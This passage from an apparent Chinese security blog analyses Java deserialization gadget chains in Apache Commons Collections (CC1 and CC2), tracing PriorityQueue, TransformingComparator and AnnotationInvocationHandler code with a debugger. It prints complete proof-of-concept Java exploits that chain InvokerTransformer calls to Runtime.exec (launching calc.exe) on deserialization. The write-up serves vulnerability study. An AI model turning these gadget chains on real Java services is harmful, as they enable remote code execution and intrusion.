class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="comment">// 获取key</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中var1是ObjectInputStream对象</p>
<p>当逐步调试至执行到if语句里面的内容时，各字段的值如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230511131341.png"></p>
<p>此时的var2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Annotation Type:</span><br><span class="line">   Member types: &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br><span class="line">   Member defaults: &#123;&#125;</span><br><span class="line">   Retention policy: RUNTIME</span><br><span class="line">   Inherited: false</span><br></pre></td></tr></table></figure>

<p>所以var3获取到为{value&#x3D;class [Ljava.lang.annotation.ElementType;}</p>
<p>这里要执行到var5.setValue…需要满足var7!&#x3D;null，需要满足的条件</p>
<ul>
<li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X </li>
<li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li>
</ul>
<p>在获取AnnotationInvocationHandler类实例的POC中，第一个参数传入的是Target.class，其存在value方法，同时为了满足第二个条件，需要在Map中放入一个key为value的元素</p>
<p>最终模拟攻击代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">// import sun.reflect.annotation.AnnotationInvocationHandler;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 服务端需要的操作</span></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="comment">// Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span></span><br><span class="line">        <span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">        <span class="comment">// onlyElement.setValue(&quot;foobar&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7031">JAVA反序列化 - Commons-Collections组件 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13779857.html">Java安全之Commons Collections1分析（一） - nice_0e3 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/index.html">Overview (Apache Commons Collections 3.2.2 API)</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化之Commons Collections2链</title>
    <url>/2023/01/12/Java-CC2/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>commons-collections 4.0</p>
<p>JDK1.7、1.8.0</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue:"></a><strong>PriorityQueue:</strong></h2><p>存在于java.util.PriorityQueue包</p>
<p>官方文档定义如下：</p>
<blockquote>
<p>An unbounded priority <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Queue.html">queue</a> based on a priority heap. The elements of the priority queue are ordered according to their <a href="https://docs.oracle.com/javase/8/docs/api/java/lang/Comparable.html">natural ordering</a>, or by a <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Comparator.html"><code>Comparator</code></a> provided at queue construction time, depending on which constructor is used. A priority queue does not permit <code>null</code> elements. A priority queue relying on natural ordering also does not permit insertion of non-comparable objects (doing so may result in <code>ClassCastException</code>).</p>
<p>大致意思为基于优先级的一个队列，按照自然顺序或者由构建队列提供的比较器进行排序，不允许有空元素</p>
</blockquote>
<p><code>PriorityQueue</code>和<code>Queue</code>的区别在于，它的出队顺序与元素的优先级有关，对<code>PriorityQueue</code>调用<code>remove()</code>或<code>poll()</code>方法，返回的总是优先级最高的元素</p>
<p>关键API：</p>
<p>插入元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span>	<span class="title function_">add</span><span class="params">(E e)</span></span><br></pre></td></tr></table></figure>

<p>移除优先级队列中的所有元素</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>	<span class="title function_">clear</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>返回优先级比较器，如果使用自然顺序进行排序，则返回null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Comparator&lt;? <span class="built_in">super</span> E&gt;	comparator()</span><br></pre></td></tr></table></figure>

<p>判断优先级队列中是否包含此元素，如果包含则返回true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span>	<span class="title function_">contains</span><span class="params">(Object o)</span></span><br></pre></td></tr></table></figure>

<p>返回在此队列上进行元素迭代的迭代器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Iterator&lt;E&gt;	<span class="title function_">iterator</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>将指定元素插入到优先级队列中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span>	<span class="title function_">offer</span><span class="params">(E e)</span></span><br></pre></td></tr></table></figure>

<p>返回队头</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">E	<span class="title function_">peek</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>返回队头，并且从队列中删除</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">E	<span class="title function_">poll</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>从此队列中移除指定元素的单个实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span>	<span class="title function_">remove</span><span class="params">(Object o)</span></span><br></pre></td></tr></table></figure>

<p>更多API查看官方文档：<a href="https://docs.oracle.com/javase/8/docs/api/java/util/PriorityQueue.html">https://docs.oracle.com/javase/8/docs/api/java/util/PriorityQueue.html</a></p>
<h2 id="Filed"><a href="#Filed" class="headerlink" title="Filed"></a>Filed</h2><p>存在于反射包中，即java.lang.reflect</p>
<p>Java8官方文档介绍：</p>
<blockquote>
<p>A <code>Field</code> provides information about, and dynamic access to, a single field of a class or an interface. The reflected field may be a class (static) field or an instance field.</p>
<p>A <code>Field</code> permits widening conversions to occur during a get or set access operation, but throws an <code>IllegalArgumentException</code> if a narrowing conversion would occur.</p>
<p>大致意思：提供类或接口的单个字段的信息和动态访问；在访问时允许加宽操作，不允许缩小操作</p>
</blockquote>
<p>在此对象上返回该所表示的字段的值 Field</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object	<span class="title function_">get</span><span class="params">(Object obj)</span></span><br></pre></td></tr></table></figure>

<p>将指定对象参数上的此 Field 对象表示的字段设置为指定的新值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>	<span class="title function_">set</span><span class="params">(Object obj, Object value)</span></span><br></pre></td></tr></table></figure>

<p>更多API查看官方文档：<a href="https://docs.oracle.com/javase/8/docs/api/">https://docs.oracle.com/javase/8/docs/api/</a></p>
<h1 id="CC2链"><a href="#CC2链" class="headerlink" title="CC2链"></a>CC2链</h1><p>Commons Collections寻找链的关键为：寻找一条<code>Serializable#readObject()</code>到<code>Transformer#transform()</code>方法的调用链</p>
<h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="comment">// import java.util.Comparator;</span></span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">commons_collections2</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        <span class="comment">//与CC1一样</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造的transformers数组</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="comment">//将伪造的transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化PriorityQueue对象，初始大小为2，并且传入比较时的Comparator</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(queue,comparator);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// System.out.println(barr);</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这条链很清晰，是从PriorityQueue#readObject到Transformer#transform()的一个过程，两者通过TransformingComparator的compare方法衔接</p>
<h2 id="POC1调试分析"><a href="#POC1调试分析" class="headerlink" title="POC1调试分析"></a>POC1调试分析</h2><p>在POC1中触发漏洞是<code>Object o = (Object)ois.readObject();</code>，其进一步调用的是PriorityQueue#readObject，在PriorityQueue#readObject中下断点调试，查看readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行到heapify函数前的变量情况</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230515104217.png"></p>
<p>并且此时传入的queue对数组存放的元素正是我们在POC中对queue add的参数，即Int对象1和2，这里的size是往queue中添加元素的个数，通过后面代码可以分析为什么需要听见两个元素，当然也可以添加更多</p>
<p>其中for循环是将所有的元素读取存入queue，接下来的<code>heapify()</code>函数是为了保持元素的顺序正确，单步进入该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Establishes the heap invariant (described above) in the entire tree,</span></span><br><span class="line"><span class="comment">     * assuming nothing about the order of the elements prior to the call.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数仍然定义在类PriorityQueue中，查看代码中具体的注释即可理解该函数的作用</p>
<p>前面可知size的大小为2，经过无符号右移得到的i初始为0，进入for循环siftDown函数，第一轮传入的参数为(0, 整形对象1)，单步进入该函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts item x at position k, maintaining heap invariant by</span></span><br><span class="line"><span class="comment">     * demoting x down the tree repeatedly until it is less than or</span></span><br><span class="line"><span class="comment">     * equal to its children or is a leaf.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> k the position to fill</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x the item to insert</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过函数注释了解到该函数的功能是将元素x插入到位置k，同时降低x的位置使其小于或等于其子节点或叶子节点</p>
<p>在这个if循环中，如果存在comparator，则会执行siftDownUsingComparator，而如果不存在，则会通过自然顺序进行比较</p>
<p>在POC中的语句中设置了比较器如下语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(queue,comparator);</span><br></pre></td></tr></table></figure>

<p>所以这里程序会进入至siftDownUsingComparator函数，参数同样是(0, 整形对象1)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="comment">// 左节点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="comment">// 右节点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 调用comparator.compare方法比较左右节点</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 左节点&gt;右节点   调整当前节点的值是右节点的值</span></span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="comment">// 调用compare方法比较当前节点和c</span></span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个if前各参数的值</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230515115339.png"></p>
<p>由于第一个if条件不满足，以同样的值进入第二个if条件判断，进入我们构造的TransformingComparator对象的compare函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">    <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时各变量的值为</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230515121015.png"></p>
<p>注意 iTransformers的值是反射设置的，即POC中的以下语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    filed.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意this.transformer是ChainedTransformer对象，此时的compare调用了ChainedTransformer的transform方法，F7步入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(T object)</span> &#123;</span><br><span class="line">    Transformer[] arr$ = <span class="built_in">this</span>.iTransformers;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> arr$.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">        Transformer&lt;? <span class="built_in">super</span> T, ? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; iTransformer = arr$[i$];</span><br><span class="line">        object = iTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过阅读代码就可以发现这里通过反射设置iTransformers的原因，for循环将数组中的对象拼接起来</p>
<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230515153029.png"></p>
<p>拼接完后成功命令执行</p>
<p>调用栈如下：</p>
